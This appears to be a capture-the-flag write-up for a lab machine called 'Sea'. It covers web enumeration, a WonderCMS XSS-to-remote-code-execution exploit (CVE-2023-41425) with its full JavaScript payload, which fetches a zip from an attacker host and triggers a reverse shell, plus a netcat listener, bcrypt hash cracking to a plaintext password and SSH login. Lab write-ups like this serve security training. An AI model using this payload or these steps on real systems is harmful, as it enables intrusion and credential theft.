---
name: Sea
published: false
---

```
$ sudo nmap -sV -sC 10.10.11.28
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 16:41 CET
Nmap scan report for 10.10.11.28
Host is up (0.0081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

```
$ sudo nmap -p- 10.10.11.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 16:55 CET
Nmap scan report for sea.htb (10.10.11.28)
Host is up (0.0065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds
```

Just SSH and Apache waiting for us.

```
$ gobuster dir --url http://10.10.11.28/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/0                    (Status: 200) [Size: 3670]
/404                  (Status: 200) [Size: 3361]
/Documents and Settings (Status: 403) [Size: 199]
/Program Files        (Status: 403) [Size: 199]
/data                 (Status: 301) [Size: 232] [--> http://10.10.11.28/data/]
/home                 (Status: 200) [Size: 3670]
/index.php            (Status: 200) [Size: 3670]
/messages             (Status: 301) [Size: 236] [--> http://10.10.11.28/messages/]
/plugins              (Status: 301) [Size: 235] [--> http://10.10.11.28/plugins/]
/reports list         (Status: 403) [Size: 199]
/server-status        (Status: 403) [Size: 199]
/themes               (Status: 301) [Size: 234] [--> http://10.10.11.28/themes/]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

I'm interested mostly in those `301`'s. They seem to point to the trailing-slash version of themselves which seems to indicate they are directories. I will run more `gobuster` on each of them, picking a bigger wordlist than before to make sure we get everything.

```
$ gobuster dir --url http://sea.htb/data --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 234] [--> http://sea.htb/data/files/]
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/Reports List         (Status: 403) [Size: 199]
/external files       (Status: 403) [Size: 199]
/Style Library        (Status: 403) [Size: 199]
/modern mom           (Status: 403) [Size: 199]
/neuf giga photo      (Status: 403) [Size: 199]
/Web References       (Status: 403) [Size: 199]
/My Project           (Status: 403) [Size: 199]
/Contact Us           (Status: 403) [Size: 199]
/Donate Cash          (Status: 403) [Size: 199]
/Home Page            (Status: 403) [Size: 199]
/Planned Giving       (Status: 403) [Size: 199]
/Press Releases       (Status: 403) [Size: 199]
/Privacy Policy       (Status: 403) [Size: 199]
/Site Map             (Status: 403) [Size: 199]
/About Us             (Status: 403) [Size: 199]
/Bequest Gift         (Status: 403) [Size: 199]
/Gift Form            (Status: 403) [Size: 199]
/Life Income Gift     (Status: 403) [Size: 199]
/New Folder           (Status: 403) [Size: 199]
/Site Assets          (Status: 403) [Size: 199]
/What is New          (Status: 403) [Size: 199]
Progress: 23570 / 30001 (78.56%)[ERROR] parse "http://sea.htb/data/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
===============================================================
Finished
===============================================================

$ gobuster dir --url http://sea.htb/themes/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/Reports List         (Status: 403) [Size: 199]
/external files       (Status: 403) [Size: 199]
/Style Library        (Status: 403) [Size: 199]
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
/modern mom           (Status: 403) [Size: 199]
/neuf giga photo      (Status: 403) [Size: 199]
/Web References       (Status: 403) [Size: 199]
/My Project           (Status: 403) [Size: 199]
/Contact Us           (Status: 403) [Size: 199]
/Donate Cash          (Status: 403) [Size: 199]
/Home Page            (Status: 403) [Size: 199]
/Planned Giving       (Status: 403) [Size: 199]
/Press Releases       (Status: 403) [Size: 199]
/Privacy Policy       (Status: 403) [Size: 199]
/Site Map             (Status: 403) [Size: 199]
/About Us             (Status: 403) [Size: 199]
/Bequest Gift         (Status: 403) [Size: 199]
/Gift Form            (Status: 403) [Size: 199]
/Life Income Gift     (Status: 403) [Size: 199]
/New Folder           (Status: 403) [Size: 199]
/Site Assets          (Status: 403) [Size: 199]
/What is New          (Status: 403) [Size: 199]
Progress: 23573 / 30001 (78.57%)[ERROR] parse "http://sea.htb/themes/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
===============================================================
Finished
===============================================================
```

We find two more directories: `/data/files` and `/themes/bike`! Let's dive deeper once more:

```
gobuster dir --url http://sea.htb/data/files --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data/files
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.                    (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/.php                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/wp-forum.phps        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htuser              (Status: 403) [Size: 199]
/.ht                  (Status: 403) [Size: 199]
/.htc                 (Status: 403) [Size: 199]
/Copy of index.html   (Status: 403) [Size: 199]
Progress: 17129 / 17130 (99.99%)
===============================================================
Finished
===============================================================
```

`/data/files` comes out to a dead end, there's nothing here.

```
$ gobuster dir --url http://sea.htb/themes/bike --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.                    (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/.php                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/wp-forum.phps        (Status: 403) [Size: 199]
/theme.php            (Status: 500) [Size: 227]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htuser              (Status: 403) [Size: 199]
/.ht                  (Status: 403) [Size: 199]
/.htc                 (Status: 403) [Size: 199]
/Copy of index.html   (Status: 403) [Size: 199]
Progress: 17129 / 17130 (99.99%)
===============================================================
Finished
===============================================================

┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir --url http://sea.htb/themes/bike --wordlist /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%3f/                 (Status: 403) [Size: 199]
/.ht_wsr.txt          (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess-local      (Status: 403) [Size: 199]
/.htaccess-dev        (Status: 403) [Size: 199]
/.htaccess-marco      (Status: 403) [Size: 199]
/.htaccess.BAK        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htaccess.bak1       (Status: 403) [Size: 199]
/.htaccess.save       (Status: 403) [Size: 199]
/.htaccess.old        (Status: 403) [Size: 199]
/.htaccess.orig       (Status: 403) [Size: 199]
/.htaccess.sample     (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htaccess_extra      (Status: 403) [Size: 199]
/.htaccess_orig       (Status: 403) [Size: 199]
/.htaccess_sc         (Status: 403) [Size: 199]
/.htaccessBAK         (Status: 403) [Size: 199]
/.htaccessOLD         (Status: 403) [Size: 199]
/.htaccessOLD2        (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/.htaccess~           (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd-old        (Status: 403) [Size: 199]
/.htpasswd_test       (Status: 403) [Size: 199]
/.htusers             (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/admin%20/            (Status: 403) [Size: 199]
/index.phps           (Status: 403) [Size: 199]
/New%20Folder         (Status: 403) [Size: 199]
/New%20folder%20(2)   (Status: 403) [Size: 199]
/Read%20Me.txt        (Status: 403) [Size: 199]
/README.md            (Status: 200) [Size: 318]
/sym/root/home/       (Status: 200) [Size: 3650]
/version              (Status: 200) [Size: 6]
Progress: 2565 / 2566 (99.96%)
===============================================================
Finished
===============================================================
```

`/themes/bike` at first looks just as dissapointing, but when we run with the `quickhits` wordlist we find two files and another directory available!

I went back and checked `/data/files` with `quickhits, it gives up the sane `/sym/root/home` folder:

```
$ gobuster dir --url http://sea.htb/data/files --wordlist /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data/files
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%3f/                 (Status: 403) [Size: 199]
/.ht_wsr.txt          (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htaccess-dev        (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess-local      (Status: 403) [Size: 199]
/.htaccess.BAK        (Status: 403) [Size: 199]
/.htaccess-marco      (Status: 403) [Size: 199]
/.htaccess.save       (Status: 403) [Size: 199]
/.htaccess.sample     (Status: 403) [Size: 199]
/.htaccess.orig       (Status: 403) [Size: 199]
/.htaccess.bak1       (Status: 403) [Size: 199]
/.htaccess.old        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htaccess_orig       (Status: 403) [Size: 199]
/.htaccess_extra      (Status: 403) [Size: 199]
/.htaccessOLD2        (Status: 403) [Size: 199]
/.htaccess~           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/.htaccess_sc         (Status: 403) [Size: 199]
/.htaccessBAK         (Status: 403) [Size: 199]
/.htaccessOLD         (Status: 403) [Size: 199]
/.htpasswd_test       (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd-old        (Status: 403) [Size: 199]
/.htusers             (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/admin%20/            (Status: 403) [Size: 199]
/index.phps           (Status: 403) [Size: 199]
/New%20Folder         (Status: 403) [Size: 199]
/New%20folder%20(2)   (Status: 403) [Size: 199]
/Read%20Me.txt        (Status: 403) [Size: 199]
/sym/root/home/       (Status: 200) [Size: 3650]
Progress: 2565 / 2566 (99.96%)
===============================================================
Finished
===============================================================
```

In `version` we can see the version is `3.2.0` which is vulnerable to CVE-2023-41425.

https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE

```
$ cat xss.js

var url = "http://sea.htb/loginURL";
if (url.endsWith("/")) {
    url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlObj = new URL(urlWithoutLog);
var urlWithoutLogBase = urlObj.origin + '/';
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase + "/?installModule=http://10.10.14.14:8000/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
    if (xhr3.status == 200) {
        var xhr4 = new XMLHttpRequest();
        xhr4.withCredentials = true;
        xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
        xhr4.send();
        xhr4.onload = function() {
            if (xhr4.status == 200) {
                var ip = "10.10.14.14";
                var port = "4001";
                var xhr5 = new XMLHttpRequest();
                xhr5.withCredentials = true;
                xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
                xhr5.send();
            }
        };
    }
};
```

```
$ ./exploit.py -u http://sea.htb/loginURL -i 10.10.14.14 -p 4001 -r http://10.10.14.14:8000/main.zip



================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================

[+]The zip file will be downloaded from the host:    http://10.10.14.14:8000/main.zip

[+] File created:  xss.js

[+] Set up nc to listen on your terminal for the reverse shell
        Use:
                   nc -nvlp 4001

[+] Send the below link to admin:

         http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [17/Dec/2024 09:45:54] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
```

```
$ nc -lvnp 4001
listening on [any] 4001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.28] 48526
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 08:46:20 up 10 min,  0 users,  load average: 0.06, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```
www-data@sea:/$ cd /var/www

www-data@sea:/var/www$ ls

html  sea

www-data@sea:/var/www$ cd sea

www-data@sea:/var/www/sea$ ls -l
total 116
-rwxr-xr-x 1 www-data www-data  3521 Feb 21  2024 contact.php
drwxr-xr-x 3 www-data www-data  4096 Feb 22  2024 data
-rwxr-xr-x 1 www-data www-data 96604 Feb 22  2024 index.php
drwxrwxr-x 2 www-data www-data  4096 Dec 17 08:53 messages
drwxr-xr-x 2 www-data www-data  4096 Feb 21  2024 plugins
drwxr-xr-x 4 www-data www-data  4096 Dec 17 08:46 themes

www-data@sea:/var/www/sea$ cd data

www-data@sea:/var/www/sea/data$ ls
cache.json  database.js  files

www-data@sea:/var/www/sea/data$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/12\/17 08:52:34": "127.0.0.1",
            "2024\/12\/17 08:46:04": "127.0.0.1",
            "2024\/07\/31 15:17:10": "127.0.0.1",
            "2024\/07\/31 15:15:10": "127.0.0.1",
            "2024\/07\/31 15:14:10": "127.0.0.1"
        },
        "lastModulesSync": "2024\/12\/17",

        .......
    }
}

```

```
$ hashcat -m 3200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 7 7700X 8-Core Processor, 2858/5780 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Tue Dec 17 10:00:31 2024 (28 secs)
Time.Estimated...: Tue Dec 17 10:00:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      110 H/s (4.52ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344384 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 3056/14344384 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 753159 -> dangerous

Started: Tue Dec 17 10:00:28 2024
Stopped: Tue Dec 17 10:01:01 2024
```

The hash corresponds to a password of `mychemicalromance`

```
www-data@sea:/home$ ls
ls
amay  geo
www-data@sea:/home$ ls geo
ls geo
ls: cannot open directory 'geo': Permission denied
www-data@sea:/home$ ls amay
ls amay
user.txt
www-data@sea:/home$
```

User flag belongs to `amay`

```
$ ssh amay@sea.htb
The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
amay@sea.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 17 Dec 2024 09:02:39 AM UTC

  System load:  1.38              Processes:             255
  Usage of /:   63.3% of 6.51GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.10.11.28
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40
amay@sea:~$
```

```
amay@sea:~$ cat user.txt
cc2f414a81b74966e**********
```

```
amay@sea:~$ netstat -tnp
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          127.0.0.1:48338         TIME_WAIT   -
tcp        1      0 127.0.0.1:80            127.0.0.1:44812         CLOSE_WAIT  -
tcp        0      0 10.10.11.28:51034       10.10.14.14:4001        ESTABLISHED -
tcp        0      0 127.0.0.1:50473         127.0.0.1:43468         ESTABLISHED -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45196         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45374         TIME_WAIT   -
tcp        0      0 127.0.0.1:80            127.0.0.1:36392         ESTABLISHED -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45346         TIME_WAIT   -
tcp        0      0 10.10.11.28:48526       10.10.14.14:4001        CLOSE_WAIT  -
tcp        0      1 10.10.11.28:54276       8.8.8.8:53              SYN_SENT    -
tcp        0    216 10.10.11.28:22          10.10.14.14:34580       ESTABLISHED -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45362         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33366         TIME_WAIT   -
tcp        0      0 127.0.0.1:43468         127.0.0.1:50473         ESTABLISHED -
tcp        0      0 127.0.0.1:8080          127.0.0.1:48352         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33364         TIME_WAIT   -
tcp        1      0 127.0.0.1:55270         127.0.0.1:80            CLOSE_WAIT  -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33168         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:39692         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:39678         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:39694         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45210         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45354         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:45200         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:48368         TIME_WAIT   -
tcp        0      0 127.0.0.1:36392         127.0.0.1:80            ESTABLISHED -
tcp        1      0 127.0.0.1:49100         127.0.0.1:80            CLOSE_WAIT  -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33362         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33174         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:33156         TIME_WAIT   -
tcp        0      0 127.0.0.1:8080          127.0.0.1:48362         TIME_WAIT   -
```

```
$ ssh -L 8888:localhost:8080 amay@sea.htb
```
